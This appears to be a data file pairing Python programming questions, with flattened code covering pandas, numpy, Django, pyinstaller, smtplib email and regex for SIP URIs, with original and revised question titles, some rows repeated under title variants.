How to initialize," I am a newbie to Python. I need to create a simple student class which includes first name, last name, id, and a dictionary which maps course name to its grade. My question is how can I initizalize the dictionary values inside the constructor?For example, let`s say I would like to add 3 course to grade mappings: ""math: 100""""bio: 90""""history: 80""For example: The last 3 values should go into the dictionary. Since the number of key-value which can be part of the dictionary can vary, what should I write in the constructor parameter signature?I want to send all the student values when I call the constructor... <code>  class Student: def __init__(self, firstName, lastName, id, _____ (dictionary values)): self._firstName = firstName; self._lastName = lastName; self._id = id; self. student1 = Student(""Edward"", ""Gates"", ""0456789"", math: 100, bio: 90, history: 80)",Passing dictionary values as constructor's arguments
Passing a map as constructor's parameter," I am a newbie to Python. I need to create a simple student class which includes first name, last name, id, and a dictionary which maps course name to its grade. My question is how can I initizalize the dictionary values inside the constructor?For example, let`s say I would like to add 3 course to grade mappings: ""math: 100""""bio: 90""""history: 80""For example: The last 3 values should go into the dictionary. Since the number of key-value which can be part of the dictionary can vary, what should I write in the constructor parameter signature?I want to send all the student values when I call the constructor... <code>  class Student: def __init__(self, firstName, lastName, id, _____ (dictionary values)): self._firstName = firstName; self._lastName = lastName; self._id = id; self. student1 = Student(""Edward"", ""Gates"", ""0456789"", math: 100, bio: 90, history: 80)",Passing dictionary values as constructor's arguments
Pandas : compute mean or std over entire dataframe," Here is my problem, I have a dataframe like this : and I just want to calculate the mean over the full dataframe, as the following doesn't work : Then I came up with : But this trick won't work for computing the standard deviation. My final attempts were : Except that in the latter case, it uses mean() and std() function from numpy. It's not a problem for the mean, but it is for std, as the pandas function uses by default ddof=1, unlike the numpy one where ddof=0. <code>  Depr_1 Depr_2 Depr_3S3 0 5 9S2 4 11 8S1 6 11 12S5 0 4 11S4 4 8 8 df.mean() df.mean().mean() df.get_values().mean()df.get_values().std()",Pandas : compute mean or std (standard deviation) over entire dataframe
How to upload files from user's desktop to my Google cloud storage account," I need my users to upload files to my Google Cloud Storage without having to authenticate with Google. These are primarily Windows desktop/laptop users running my application. After reading through the different authentication mechanisms, I see that resumable uploads could be the one I'm looking for. The above page has the REST APIs on how to accomplish this. I have couple questions:Is this the right method for a third party to upload data into my account without logging into any Google account?Is there a Python or Java sample which contains the resumable upload related code?Thanks for your help. <code> ",How to allow anonymous uploads to cloud storage
How to take the logarithm with base n in numpy?," From the numpy documentation on logarithms, I have found functions to take the logarithm with base e, 2, and 10: However, how do I take the logarithm with base n (e.g. 42) in numpy? <code>  import numpy as npnp.log(np.e**3) #3.0np.log2(2**3) #3.0np.log10(10**3) #3.0",NumPy: Logarithm with base n
Accessing data files with pyinstaller," I have successfully edited my spec file and added the folder with my data to it. It builds fine but it still can't access the data. WHen i try to run the compiled .exe i get this error: Error loading Python DLL: C:\Users\Sal\AppData\Local\Temp\_MEI60122\python27.dll (error code 126)EDIT 1 - I still don't have this figured out my spec file looks like this: EDIT 2 I am using 32-Bit python on a 64-bit OS(windows 8) and it has been brought to my attention that this could potentially be causing my issue, but still no solution.EDIT 3So i have just tried download 64-bit python and putting it in my system path. ran pyinstaller with my .spec file and still got the exact same error code! What is going on here! A curious detail though is that the icon=""C:\Users\Sal\Desktop\Raindropmemory-Legendora-BrokenSword.ico"") statement from spec file executed and updated the icon successfully, where as before it would not. EDIT 4This is the statement i have in my code for MEIPASS straight from the documentation. <code>  a = Analysis(['Clock_In.py'], pathex=['C:\\Users\\Sal\\Desktop'], hiddenimports=[], hookspath=None, runtime_hooks=None)a.datas += [('CO_time.pkl','CO_time.pkl', 'DATA')]a.datas += [('hours.pkl','hours.pkl', 'DATA')]a.datas += [('Obj_file.pkl','Obj_file.pkl', 'DATA')]a.datas += [('weekly_hours_dict.pkl','weekly_hours_dict.pkl', 'DATA')]pyz = PYZ(a.pure)exe = EXE(pyz, a.datas, a.binaries, a.scripts, exclude_binaries=True, name='Clock_In.exe', debug=False, strip=None, upx=True, console=True, icon=""C:\Users\Sal\Desktop\Raindropmemory-Legendora-BrokenSword.ico"")coll = COLLECT(exe, a.binaries, a.zipfiles, a.datas, strip=None, upx=True, **name='Clock_In') if getattr(sys, 'frozen', False):# we are running in a |PyInstaller| bundlebasedir = sys._MEIPASSelse:# we are running in a normal Python environmentbasedir = os.path.dirname(__file__)",Error loading python27.dll error for pyinstaller
Accessing data files with pyinstaller and error code 126," I have successfully edited my spec file and added the folder with my data to it. It builds fine but it still can't access the data. WHen i try to run the compiled .exe i get this error: Error loading Python DLL: C:\Users\Sal\AppData\Local\Temp\_MEI60122\python27.dll (error code 126)EDIT 1 - I still don't have this figured out my spec file looks like this: EDIT 2 I am using 32-Bit python on a 64-bit OS(windows 8) and it has been brought to my attention that this could potentially be causing my issue, but still no solution.EDIT 3So i have just tried download 64-bit python and putting it in my system path. ran pyinstaller with my .spec file and still got the exact same error code! What is going on here! A curious detail though is that the icon=""C:\Users\Sal\Desktop\Raindropmemory-Legendora-BrokenSword.ico"") statement from spec file executed and updated the icon successfully, where as before it would not. EDIT 4This is the statement i have in my code for MEIPASS straight from the documentation. <code>  a = Analysis(['Clock_In.py'], pathex=['C:\\Users\\Sal\\Desktop'], hiddenimports=[], hookspath=None, runtime_hooks=None)a.datas += [('CO_time.pkl','CO_time.pkl', 'DATA')]a.datas += [('hours.pkl','hours.pkl', 'DATA')]a.datas += [('Obj_file.pkl','Obj_file.pkl', 'DATA')]a.datas += [('weekly_hours_dict.pkl','weekly_hours_dict.pkl', 'DATA')]pyz = PYZ(a.pure)exe = EXE(pyz, a.datas, a.binaries, a.scripts, exclude_binaries=True, name='Clock_In.exe', debug=False, strip=None, upx=True, console=True, icon=""C:\Users\Sal\Desktop\Raindropmemory-Legendora-BrokenSword.ico"")coll = COLLECT(exe, a.binaries, a.zipfiles, a.datas, strip=None, upx=True, **name='Clock_In') if getattr(sys, 'frozen', False):# we are running in a |PyInstaller| bundlebasedir = sys._MEIPASSelse:# we are running in a normal Python environmentbasedir = os.path.dirname(__file__)",Error loading python27.dll error for pyinstaller
"Shuffle a list ""totally"""," How can I randomly shuffle a list so that none of the elements remains in its original position?In other words, given a list A with distinct elements, I'd like to generate a permutation B of it so thatthis permutation is randomand for each n, a[n] != b[n]e.g. I don't know the proper term for such a permutation (is it ""total""?) thus having a hard time googling. The correct term appears to be ""derangement"". <code>  a = [1,2,3,4]b = [4,1,2,3] # goodb = [4,2,1,3] # gooda = [1,2,3,4]x = [2,4,3,1] # bad",Generate a random derangement of a list
Numpy: find the the non-intersecting values of two arrays," If I have two numpy arrays and want to find the the non-intersecting values, how do I do it?Here's a short example of what I can't figure out. I want to find the non-intersecting values. In this case I want my output to be: The opposite of what I want is done with this: which returns <code>  a = ['Brian', 'Steve', 'Andrew', 'Craig']b = ['Andrew','Steve'] ['Brian','Craig'] c=np.intersect1d(a,b) ['Andrew' 'Steve']",Find the non-intersecting values of two arrays
MODELS AREN'T LOADED YET error while populating in django1.8 and python2.7.8," I am using this code to populate my database: On running It gives the error: Rest of my files are ok but getting this error. I am following the tutorial from Tango with Django book but as the book refers to Django 1.5.4 and i am using Django 1.8, so can anyone help me here? <code>  import osdef populate(): python_cat = add_cat('Python') add_page(cat=python_cat, title=""Official Python Tutorial"", url=""http://docs.python.org/2/tutorial/"") add_page(cat=python_cat, title=""How to Think like a Computer Scientist"", url=""http://www.greenteapress.com/thinkpython/"") add_page(cat=python_cat, title=""Learn Python in 10 minutes"", url=""http://www.korokithakis.net/tutorials/python/"") django_cat = add_cat(name=""Django"") add_page(cat=django_cat, title=""Official Django Tutorial"", url=""http://djangoproject.com/en/1.5/intro/tutorial01/"") add_page(cat=django_cat, title=""Django Rocks"", url=""http://www.djangorocks.com/"") add_page(cat=django_cat, title=""How to Tango with Django"", url=""htttp://www.tangowithdjango.com/"") frame_cat = add_cat(name=""Other Frameworks"") add_page(cat=frame_cat, title=""Bottle"", url=""http://bottlepy.org/docs/dev/"") add_page(cat=frame_cat, title=""Flask"", url=""http://flask.pocoo.org"") # Print out what we have added to the user. for c in Category.objects.all(): for p in Page.objects.filter(category=c): print ""- {0} - {1}"".format(str(c), str(p))def add_page(cat, title, url, views=0): p = Page.objects.get_or_create(category=cat, title=title, url=url, views=views)[0] return pdef add_cat(name): c = Category.objects.get_or_create(name=name) return cif __name__ == '__main__': print ""Starting Rango population script..."" os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'p.settings') from rango.models import Category, Page populate() python c:\python27\p\populate_rango.py Staring Rango population script...Traceback (most recent call last):File ""c:\python27\p\populate_rango.py"", line 59, in <module>populate()File ""c:\python27\p\populate_rango.py"", line 4, in populatepython_cat = add_cat('Python')File ""c:\python27\p\populate_rango.py"", line 52, in add_catc = Category.objects.get_or_create(name=name)File ""C:\Python27\Lib\site-packages\django\db\models\manager.py"", limanager_methodreturn getattr(self.get_queryset(), name)(*args, **kwargs)File ""C:\Python27\Lib\site-packages\django\db\models\query.py"", lineet_or_createreturn self.get(**lookup), FalseFile ""C:\Python27\Lib\site-packages\django\db\models\query.py"", lineclone = self.filter(*args, **kwargs)File ""C:\Python27\Lib\site-packages\django\db\models\query.py"", lineilterreturn self._filter_or_exclude(False, *args, **kwargs)File ""C:\Python27\Lib\site-packages\django\db\models\query.py"", linefilter_or_excludeclone.query.add_q(Q(*args, **kwargs))File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in add_qclause, require_inner = self._add_q(where_part, self.used_aliases)File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in _add_qcurrent_negated=current_negated, connector=connector)File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in build_filterlookups, parts, reffed_aggregate = self.solve_lookup_type(arg)File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in solve_lookup_type_, field, _, lookup_parts = self.names_to_path(lookup_splitted, sea())File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in names_to_pathfield, model, direct, m2m = opts.get_field_by_name(name)File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", liget_field_by_namecache = self.init_name_map()File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", liinit_name_mapfor f, model in self.get_all_related_m2m_objects_with_model():File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", liget_all_related_m2m_objects_with_modelcache = self._fill_related_many_to_many_cache()File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", li_fill_related_many_to_many_cachefor klass in self.apps.get_models():File ""C:\Python27\Lib\site-packages\django\utils\lru_cache.py"", linerapperresult = user_function(*args, **kwds)File ""C:\Python27\Lib\site-packages\django\apps\registry.py"", line 1_models*self.check_models_ready()File ""C:\Python27\Lib\site-packages\django\apps\registry.py"", line 1ck_models_readyraise AppRegistryNotReady(""Models aren't loaded yet."")django.core.exceptions.AppRegistryNotReady: Models aren't loaded yet.*","""Models aren't loaded yet"" error while populating in Django 1.8 or later"
"""Models aren't loaded yet"" error while populating in django1.8 and python2.7.8"," I am using this code to populate my database: On running It gives the error: Rest of my files are ok but getting this error. I am following the tutorial from Tango with Django book but as the book refers to Django 1.5.4 and i am using Django 1.8, so can anyone help me here? <code>  import osdef populate(): python_cat = add_cat('Python') add_page(cat=python_cat, title=""Official Python Tutorial"", url=""http://docs.python.org/2/tutorial/"") add_page(cat=python_cat, title=""How to Think like a Computer Scientist"", url=""http://www.greenteapress.com/thinkpython/"") add_page(cat=python_cat, title=""Learn Python in 10 minutes"", url=""http://www.korokithakis.net/tutorials/python/"") django_cat = add_cat(name=""Django"") add_page(cat=django_cat, title=""Official Django Tutorial"", url=""http://djangoproject.com/en/1.5/intro/tutorial01/"") add_page(cat=django_cat, title=""Django Rocks"", url=""http://www.djangorocks.com/"") add_page(cat=django_cat, title=""How to Tango with Django"", url=""htttp://www.tangowithdjango.com/"") frame_cat = add_cat(name=""Other Frameworks"") add_page(cat=frame_cat, title=""Bottle"", url=""http://bottlepy.org/docs/dev/"") add_page(cat=frame_cat, title=""Flask"", url=""http://flask.pocoo.org"") # Print out what we have added to the user. for c in Category.objects.all(): for p in Page.objects.filter(category=c): print ""- {0} - {1}"".format(str(c), str(p))def add_page(cat, title, url, views=0): p = Page.objects.get_or_create(category=cat, title=title, url=url, views=views)[0] return pdef add_cat(name): c = Category.objects.get_or_create(name=name) return cif __name__ == '__main__': print ""Starting Rango population script..."" os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'p.settings') from rango.models import Category, Page populate() python c:\python27\p\populate_rango.py Staring Rango population script...Traceback (most recent call last):File ""c:\python27\p\populate_rango.py"", line 59, in <module>populate()File ""c:\python27\p\populate_rango.py"", line 4, in populatepython_cat = add_cat('Python')File ""c:\python27\p\populate_rango.py"", line 52, in add_catc = Category.objects.get_or_create(name=name)File ""C:\Python27\Lib\site-packages\django\db\models\manager.py"", limanager_methodreturn getattr(self.get_queryset(), name)(*args, **kwargs)File ""C:\Python27\Lib\site-packages\django\db\models\query.py"", lineet_or_createreturn self.get(**lookup), FalseFile ""C:\Python27\Lib\site-packages\django\db\models\query.py"", lineclone = self.filter(*args, **kwargs)File ""C:\Python27\Lib\site-packages\django\db\models\query.py"", lineilterreturn self._filter_or_exclude(False, *args, **kwargs)File ""C:\Python27\Lib\site-packages\django\db\models\query.py"", linefilter_or_excludeclone.query.add_q(Q(*args, **kwargs))File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in add_qclause, require_inner = self._add_q(where_part, self.used_aliases)File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in _add_qcurrent_negated=current_negated, connector=connector)File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in build_filterlookups, parts, reffed_aggregate = self.solve_lookup_type(arg)File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in solve_lookup_type_, field, _, lookup_parts = self.names_to_path(lookup_splitted, sea())File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in names_to_pathfield, model, direct, m2m = opts.get_field_by_name(name)File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", liget_field_by_namecache = self.init_name_map()File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", liinit_name_mapfor f, model in self.get_all_related_m2m_objects_with_model():File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", liget_all_related_m2m_objects_with_modelcache = self._fill_related_many_to_many_cache()File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", li_fill_related_many_to_many_cachefor klass in self.apps.get_models():File ""C:\Python27\Lib\site-packages\django\utils\lru_cache.py"", linerapperresult = user_function(*args, **kwds)File ""C:\Python27\Lib\site-packages\django\apps\registry.py"", line 1_models*self.check_models_ready()File ""C:\Python27\Lib\site-packages\django\apps\registry.py"", line 1ck_models_readyraise AppRegistryNotReady(""Models aren't loaded yet."")django.core.exceptions.AppRegistryNotReady: Models aren't loaded yet.*","""Models aren't loaded yet"" error while populating in Django 1.8 or later"
"""Models aren't loaded yet"" error while populating in Django 1.8 and Python 2.7.8"," I am using this code to populate my database: On running It gives the error: Rest of my files are ok but getting this error. I am following the tutorial from Tango with Django book but as the book refers to Django 1.5.4 and i am using Django 1.8, so can anyone help me here? <code>  import osdef populate(): python_cat = add_cat('Python') add_page(cat=python_cat, title=""Official Python Tutorial"", url=""http://docs.python.org/2/tutorial/"") add_page(cat=python_cat, title=""How to Think like a Computer Scientist"", url=""http://www.greenteapress.com/thinkpython/"") add_page(cat=python_cat, title=""Learn Python in 10 minutes"", url=""http://www.korokithakis.net/tutorials/python/"") django_cat = add_cat(name=""Django"") add_page(cat=django_cat, title=""Official Django Tutorial"", url=""http://djangoproject.com/en/1.5/intro/tutorial01/"") add_page(cat=django_cat, title=""Django Rocks"", url=""http://www.djangorocks.com/"") add_page(cat=django_cat, title=""How to Tango with Django"", url=""htttp://www.tangowithdjango.com/"") frame_cat = add_cat(name=""Other Frameworks"") add_page(cat=frame_cat, title=""Bottle"", url=""http://bottlepy.org/docs/dev/"") add_page(cat=frame_cat, title=""Flask"", url=""http://flask.pocoo.org"") # Print out what we have added to the user. for c in Category.objects.all(): for p in Page.objects.filter(category=c): print ""- {0} - {1}"".format(str(c), str(p))def add_page(cat, title, url, views=0): p = Page.objects.get_or_create(category=cat, title=title, url=url, views=views)[0] return pdef add_cat(name): c = Category.objects.get_or_create(name=name) return cif __name__ == '__main__': print ""Starting Rango population script..."" os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'p.settings') from rango.models import Category, Page populate() python c:\python27\p\populate_rango.py Staring Rango population script...Traceback (most recent call last):File ""c:\python27\p\populate_rango.py"", line 59, in <module>populate()File ""c:\python27\p\populate_rango.py"", line 4, in populatepython_cat = add_cat('Python')File ""c:\python27\p\populate_rango.py"", line 52, in add_catc = Category.objects.get_or_create(name=name)File ""C:\Python27\Lib\site-packages\django\db\models\manager.py"", limanager_methodreturn getattr(self.get_queryset(), name)(*args, **kwargs)File ""C:\Python27\Lib\site-packages\django\db\models\query.py"", lineet_or_createreturn self.get(**lookup), FalseFile ""C:\Python27\Lib\site-packages\django\db\models\query.py"", lineclone = self.filter(*args, **kwargs)File ""C:\Python27\Lib\site-packages\django\db\models\query.py"", lineilterreturn self._filter_or_exclude(False, *args, **kwargs)File ""C:\Python27\Lib\site-packages\django\db\models\query.py"", linefilter_or_excludeclone.query.add_q(Q(*args, **kwargs))File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in add_qclause, require_inner = self._add_q(where_part, self.used_aliases)File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in _add_qcurrent_negated=current_negated, connector=connector)File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in build_filterlookups, parts, reffed_aggregate = self.solve_lookup_type(arg)File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in solve_lookup_type_, field, _, lookup_parts = self.names_to_path(lookup_splitted, sea())File ""C:\Python27\Lib\site-packages\django\db\models\sql\query.py"",in names_to_pathfield, model, direct, m2m = opts.get_field_by_name(name)File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", liget_field_by_namecache = self.init_name_map()File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", liinit_name_mapfor f, model in self.get_all_related_m2m_objects_with_model():File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", liget_all_related_m2m_objects_with_modelcache = self._fill_related_many_to_many_cache()File ""C:\Python27\Lib\site-packages\django\db\models\options.py"", li_fill_related_many_to_many_cachefor klass in self.apps.get_models():File ""C:\Python27\Lib\site-packages\django\utils\lru_cache.py"", linerapperresult = user_function(*args, **kwds)File ""C:\Python27\Lib\site-packages\django\apps\registry.py"", line 1_models*self.check_models_ready()File ""C:\Python27\Lib\site-packages\django\apps\registry.py"", line 1ck_models_readyraise AppRegistryNotReady(""Models aren't loaded yet."")django.core.exceptions.AppRegistryNotReady: Models aren't loaded yet.*","""Models aren't loaded yet"" error while populating in Django 1.8 or later"
Deploy Python-Kivy application, I have made a desktop application in kivy and able to make single executable(.app) with pyinstaller. Now I wanted to give it to customers with the trial period of 10 days or so. The problem is how to make a trial version which stop working after 10 days of installation and even if the user un-install and install it again after trial period get over it should not work.Giving partial feature in trial version is not an option.EvnironmentMac OS and Python 2.7 with Kivy <code> ,How to make trial period for my python application?
Python 'Functions are objects'," I always hear this statement in Python (for topics such as decorators, etc. when you are passing functions, etc.) but have never really seen an elaboration on this. For example is it possible to create a class c that has only one abstract method that is called with a set of opened and closed brackets. so you can have I could be way off the mark with my understanding here, I was just curious about what people meant by this. <code>  i.e class c: @abstractmethod def method_to_be_called_by(): ... c(whatever parameters are required)",Are functions objects in Python?
Seaborn Facetgrid class," I have plotted my data with factorplot in seaborn and get facetgrid object, but still cannot understand how the following attributes could be set in such a plot:Legend size: when I plot lots of variables, I get very small legends, with small fonts.Font sizes of y and x labels (a similar problem as above) <code> ",How can I change the font size using seaborn FacetGrid?
add document attachment when sending python email," How do i add a document attachment when sending an email with python ?i get the email to send(please ignore: i am looping the email to send every 5 seconds, only for testing purposes, i want it to send every 30 min, just have to change 5 to 1800)here is my code so far. how do i attach a document from my computer? <code>  #!/usr/bin/pythonimport timeimport smtplibwhile True: TO = 'xxxx@gmail.com' SUBJECT = 'Python Email' TEXT = 'Here is the message' gmail_sender = 'xxxx@gmail.com' gmail_passwd = 'xxxx' server = smtplib.SMTP('smtp.gmail.com',587) server.ehlo() server.starttls() server.ehlo() server.login(gmail_sender, gmail_passwd) BODY = '\n'.join([ 'To: %s' % TO, 'From: %s' % gmail_sender, 'Subject:%s' % SUBJECT, '', TEXT ]) try: server.sendmail(gmail_sender,[TO], BODY) print 'email sent' except: print 'error sending mail' time.sleep(5)server.quit()",add excel file attachment when sending python email
Only import seaborn change the style of figure," I am trying to use seaborn, because of its distplot function. But I prefer the default matplotlib settings. When I import seaborn, it changes automatically the appearance of my figure.How can I use seaborn functions without changing the look of the plots? <code> ",How can I use seaborn without changing the matplotlib defaults?
How to pickle a list in Python 3.4," I'm trying to save a list of strings, so that it can be accessed later. How can it be achieved using pickle? An illustrative example could help. <code> ",Dump a list in a pickle file and retrieve it back later
How to pickle a list?," I'm trying to save a list of strings, so that it can be accessed later. How can it be achieved using pickle? An illustrative example could help. <code> ",Dump a list in a pickle file and retrieve it back later
Static Root and static confusion in Django," I am trying to read create mp3 files in django. but I am confused about static and static_root that I have configured. WHat happening is that in my code at a point when I print the below line it shows /usr/local/src/mena_recording/play/static/audio/dorris_0_.mp3code: but when I use the same thing in the next line in this piece it gives this error: code: my settings.py Would someone enlighten me please how this works ?Thank you. <code>  print settings.BASE_DIR+'/play/static/audio/'+record.driverName +'_'+str(counter)+'_'+ '.mp3' IOError at /[Errno 2] No such file or directory: u'/usr/local/src/mena_recording/play/static_root/play/static/audio/dorris_0_.oga' with open(settings.BASE_DIR+'/play/static/audio/'+record.driverName +'_'+str(counter)+'_'+ '.mp3', 'w') as mp3_file: mp3_file.write(decoded_mp3_str) mp3_file.close() STATIC_ROOT = os.path.join(BASE_DIR, 'play/static_root')STATIC_URL = '/static/'STATICFILES_DIRS = ( os.path.join(BASE_DIR, 'mena_recording/static'), os.path.join(BASE_DIR, 'play/static'), # Put strings here, like ""/home/html/static"" or ""C:/www/django/static"". # Always use forward slashes, even on Windows. # Don't forget to use absolute paths, not relative paths.)",Static Root and Static Url confusion in Django
What are all the possible calculations that could cause a NaN in python?," What are the most common operations that would cause a NaN, in Python, which originate while working with NumPy or SciPy?For example: What is the reasoning for this behavior and why does it not return 0? <code>  1e500 - 1e500>>> nan",What are some possible calculations with numpy or scipy that can return a NaN?
What are all the possible calculations that could cause a NaN in Python?," What are the most common operations that would cause a NaN, in Python, which originate while working with NumPy or SciPy?For example: What is the reasoning for this behavior and why does it not return 0? <code>  1e500 - 1e500>>> nan",What are some possible calculations with numpy or scipy that can return a NaN?
What are some the possible calculations case scenarios in Python which originate with numpy or scipy that can return a NaN?," What are the most common operations that would cause a NaN, in Python, which originate while working with NumPy or SciPy?For example: What is the reasoning for this behavior and why does it not return 0? <code>  1e500 - 1e500>>> nan",What are some possible calculations with numpy or scipy that can return a NaN?
"Python Title Case, but leave pre-existing upercase"," I'm looking for a very pythonic way (Python 3.x) of doing the following, but haven't come up with one yet. If I have the following string: I can title case it with: Which results in: However, I want to convert if I have the following string: Applying the title case results in: Should results in: I am looking for a way to do a title case, but not adjust existing upper case text. Is there any way to do this? <code>  string = 'this is a test string' string.title() 'This Is A Test String' string = 'Born in the USA' string = 'Born In The Usa' 'Born In The USA'","Python Title Case, but leave pre-existing uppercase"
Python Regular Expression for SIP URI variables?," I am using this regular expression for SIP (Session Initiation Protocol) URIs to extract the different internal variables. I need to modify this expression to support IPv6 and match all the different types of SIP URIs. The basic idea is that IPv4 shows the form 192.168.0.1 and IPv6 2620:0:2ef0:7070:250:60ff:fe03:32b7. Beacause the port number is after :, the IPv6 is between brakets in the SIP URI.Its general form is:sip:user:password@host:port;uri-parameters?headersThese are some examples: Output I tried to modify the host expression to match both [IPv6] and IPv4 expression but without luck =(I've been using https://pythex.org/ to test the results. <code>  _syntax = re.compile('^(?P<scheme>[a-zA-Z][a-zA-Z0-9\+\-\.]*):' # scheme + '(?:(?:(?P<user>[a-zA-Z0-9\-\_\.\!\~\*\'\(\)&=\+\$,;\?\/\%]+)' # user + '(?::(?P<password>[^:@;\?]+))?)@)?' # password + '(?:(?:(?P<host>[^;\?:]*)(?::(?P<port>[\d]+))?))' # host, port + '(?:;(?P<params>[^\?]*))?' # parameters + '(?:\?(?P<headers>.*))?$') # headersm = URI._syntax.match(value) if m: self.scheme, self.user, self.password, self.host, self.port, params, headers = m.groups() uriList = [ 'sip:192.1.2.3', 'sip:123@192.1.2.3', 'sip:192.1.2.3:5060', 'sips:123@[2620:0:2ef0:7070:250:60ff:fe03:32b7]', 'sip:[2620:0:2ef0:7070:250:60ff:fe03:32b7]', 'sip:[2620:0:2ef0:7070:250:60ff:fe03:32b7]:5060', 'sips:support@voip.example.com', 'sip:22444032@voip.example.com:6000', 'sip:thks.ashwin:pass@212.123.1.213', ] Scheme: sip, User: , Host: 192.1.2.3, Port: Scheme: sip, User: 123, Host: 192.1.2.3, Port: Scheme: sip, User: , Host: 192.1.2.3, Port: 5060Scheme: sips, User: 123, Host: 2620:0:2ef0:7070:250:60ff:fe03:32b7, Port: Scheme: sip, User: , Host: 2620:0:2ef0:7070:250:60ff:fe03:32b7, Port: Scheme: sip, User: , Host: 2620:0:2ef0:7070:250:60ff:fe03:32b7, Port: 5060Scheme: sips, User:support , Host: voip.example.comScheme: sip, User:22444032 , Host: voip.example.com, Port: 6000Scheme: sip, User:thks.ashwin, Password:pass ,Host: 212.123.1.213",Python Regular Expression for SIP URI variables? [SOLVED]
NLTK Wordnet Lemmatizer : Shouldn't it lemmatize all inflections of a word?," I'm using the NLTK WordNet Lemmatizer for a Part-of-Speech tagging project by first modifying each word in the training corpus to its stem (in place modification), and then training only on the new corpus. However, I found that the lemmatizer is not functioning as I expected it to.For example, the word loves is lemmatized to love which is correct, but the word loving remains loving even after lemmatization. Here loving is as in the sentence ""I'm loving it"".Isn't love the stem of the inflected word loving? Similarly, many other 'ing' forms remain as they are after lemmatization. Is this the correct behavior?What are some other lemmatizers that are accurate? (need not be in NLTK) Are there morphology analyzers or lemmatizers that also take into account a word's Part Of Speech tag, in deciding the word stem? For example, the word killing should have kill as the stem if killing is used as a verb, but it should have killing as the stem if it is used as a noun (as in the killing was done by xyz). <code> ",NLTK WordNet Lemmatizer: Shouldn't it lemmatize all inflections of a word?
Send JSON response from Sqlite queries in Python HTTPRequestHandler," I have a Python http server which listens to JSON based requests. After receiving the request, it parses the key from the JSON input, and queries Sqlite database which has such a key. Now I want to respond the request with a result JSON message. I am new to Python, and I don't know how. My code structure is like below: And the handler will write the response like this (in a class inherit BaseHTTPRequestHandler and started by a thread) <code>  import ... key=...;//get key from request con = lite.connect('test.db') with con: con.row_factory = lite.Row cur = con.cursor() cur.execute(""SELECT * FROM mytable ""); while True: row = cur.fetchone() if row == None: break if key==row['key']: # How can I add the record to the response? self.send_response(200)self.send_header('Content-Type', 'application/json')self.end_headers()self.wfile.write(??????) # What do I need to write here?",Send JSON response from Sqlite queries in Python
extracting password protected zip too slowly," i am trying to write a python-script, which should extract a zip file:Board: Beagle-Bone black ~ 1GHz Arm-Cortex-a8, debian wheezyZipfile: /home/milo/my.zip, ~ 8 MB other solutions with opening and reading-> writing the zipfile and extracting evenparticular file have the same effect. extracting take about 3-4 minutes.Extracting the same file with just using unzip-tool takes less than 2 seconds.Does anyone know what is wonrg with my code, or even with python zipfile lib??ThanksAjava <code>  >>> from zipfile import ZipFile>>> zip = ZipFile(""/home/milo/my.zip"")>>> zip.extractall(pwd=""tst"")",Python ZipFile module extracts password protected zips slowly
Compare lists in pandas DataFrame," I have a DataFrame in pandas with one of the column types being a list on int, like so: I'd like to build a filter using d, but the normal comparison operations don't seem to work: However when I inspect row by row, I get what I would expect What's going on here? How can I do list comparisons? <code>  df = pandas.DataFrame([[1,2,3,[4,5]],[6,7,8,[9,10]]], columns=['a','b','c','d'])>>> df a b c d0 1 2 3 [4, 5]1 6 7 8 [9, 10] >>> df['d'] == [4,5]0 False1 FalseName: d, dtype: bool >>> df.loc[0,'d'] == [4,5]True",Issues using compare lists in pandas DataFrame
Set dtypes in pandas DataFrame," I want to bring some data into a pandas DataFrame and I want to assign dtypes for each column on import. I want to be able to do this for larger datasets with many different columns, but, as an example: results in: TypeError: data type not understoodI tried a few other methods such as: TypeError: object of type 'type' has no len()If I put dtype=(float,int) it applies a float format to both columns.In the end I would like to just be able to pass it a list of datatypes the same way I can pass it a list of column names. <code>  myarray = np.random.randint(0,5,size=(2,2))mydf = pd.DataFrame(myarray,columns=['a','b'], dtype=[float,int])mydf.dtypes mydf = pd.DataFrame(myarray,columns=['a','b'], dtype={'a': int})",How to set dtypes by column in pandas DataFrame
How to replace all occurrences of specific words in Python," Suppose that I have the following sentence: and I want to replace all occurrences of specific words with other words. For example, bean to robert and beans to cars. I can't just use str.replace because in this case it'll change the beans to roberts. I need to change the whole words only, not the occurrences of the word in the other word. I think that I can achieve this by using regular expressions but don't know how to do it right. <code>  bean likes to sell his beans >>> ""bean likes to sell his beans"".replace(""bean"",""robert"")'robert likes to sell his roberts'",Replace all the occurrences of specific words
